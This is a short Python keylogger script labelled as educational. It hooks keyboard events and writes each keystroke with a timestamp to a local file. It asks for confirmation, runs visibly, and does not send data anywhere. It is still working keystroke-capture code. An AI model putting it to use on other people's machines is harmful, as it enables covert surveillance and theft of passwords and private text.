"""
Simple Keylogger - For Educational Use Only
Records keystrokes to a text file

"""

import keyboard
import time
from datetime import datetime

# file to save keystrokes
FILE="keylog.txt"

def by_pressing(event) :

    # record each keystroke to the log file

    if event.event_type==keyboard.KEY_DOWN :
        # formats the key strokes
        if event.name == "space":
            key=" space "
        elif len(event.name)==1:
            key=event.name
        else:
            key=f"[{event.name}]"
        
        # writing to file
        with open(FILE,'a') as f :
            timestamp=datetime.now().strftime('%H:%M:%S')
            f.write(f"{timestamp} : {key}\n")

def main() :
    # Confirmation message
    print(" Simple Keylogger - For Educational Use ")
    confirmation = input("Start keylogger? (y/n) : ")
    if confirmation.lower() not in ["y","yes"] :
        print(" Exiting. ")
        return
    
    # starts freash log file
    with open(FILE,'w') as f :
        f.write(f"=== Started : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ====\n")
    
    # registered keyboard hook
    keyboard.on_press(by_pressing)
    
    print(f" Keylogger running. Recording to '{FILE}' ")
    print(" Press Ctrl+C to stop ")
    
    # keep running until interrupted
    try :
        while True :
            time.sleep(0.1)
    except KeyboardInterrupt :
        keyboard.unhook_all()
        print(f" Stopped. Log saved to '{FILE}' ")

main()

# END